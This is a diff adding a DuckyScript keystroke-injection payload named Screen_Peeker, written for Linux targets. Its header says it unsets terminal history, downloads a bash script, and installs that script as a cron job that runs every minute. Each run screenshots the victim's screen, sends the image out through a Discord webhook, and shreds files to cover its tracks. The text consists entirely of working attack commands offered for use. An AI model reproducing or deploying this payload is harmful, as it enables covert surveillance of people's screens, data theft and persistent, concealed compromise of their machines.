@@ -1,0 +1,19 @@
+REM TITLE: Screen_Peeker
+REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
+REM TARGET OS: Linux (tested on Kali Linux)
+REM DESCRIPTION: Screen_Peeker will unset the terminal history, download a bash script (.sp.sh) that will embed itself as a cronjob, take a screenshot of target system, exfiltrate the screenshot via Discord webhook, and then shred the file to obfuscate. Place Discord webhook in line 6 | The frequency of when the script is ran can be changed in line 19 via the (* * * * *) field. By default it will take a screenshot and exfiltrate it every minute.
+
+DEFINE #Discord_Webhook https://discord.com/api/webhooks/PLACE/DISCORD/WEBHOOK/HERE
+
+REM Begin attack:
+ATTACKMODE HID
+DELAY 1000
+
+REM Opening terminal, unsetting terminal history, and downloading .sp.sh shell script:
+CTRL ALT t
+DELAY 300
+STRINGLN unset HISTFILE && wget githubraw
+DELAY 1200
+
+REM: Granting execution permissions to .sp.sh, adding Discord webhook, and embedding with cron:
+STRINGLN chmod +x .sp.sh && sed -i '14s/.*/    #Discord_Webhook/' .sp.sh && crontab -l > sptemp && echo "* * * * * ~/.sp.sh" >> sptemp && crontab sptemp && shred -fuz sptemp
